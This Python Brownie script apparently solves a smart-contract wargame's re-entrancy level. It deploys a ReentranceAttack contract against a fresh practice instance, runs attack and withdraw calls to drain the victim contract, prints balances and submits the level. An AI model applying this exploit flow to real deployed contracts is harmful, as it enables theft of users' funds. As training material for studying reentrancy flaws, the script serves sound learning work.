from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
    ReentranceAttack,
)
from scripts.helpful_scripts import (
    get_account,
    get_new_instance,
    submit_instance,
)
from web3 import Web3


def main():
    player = get_account()
    instance_address = get_new_instance(level_id=10, player=player, value=Web3.toWei("0.001", "ether"))

    reentrance_contract = interface.IReentrance(instance_address)
    attack_contract = ReentranceAttack.deploy(reentrance_contract, {"from": player})

    print("Balances")
    print(f'Player: {Web3.fromWei(player.balance(), "ether")}')
    print(f'Victim contract: {Web3.fromWei(reentrance_contract.balance(), "ether")}')
    print()

    tx = reentrance_contract.donate(attack_contract, {"from": player, "value": reentrance_contract.balance()})
    tx.wait(1)
    tx = attack_contract.attack({"from": player})
    tx.wait(1)
    tx = attack_contract.withdraw({"from": player})
    tx.wait(1)

    print("Balances")
    print(f'Player: {Web3.fromWei(player.balance(), "ether")}')
    print(f'Victim contract: {Web3.fromWei(reentrance_contract.balance(), "ether")}')
    print()

    submit_instance(instance_address, player)
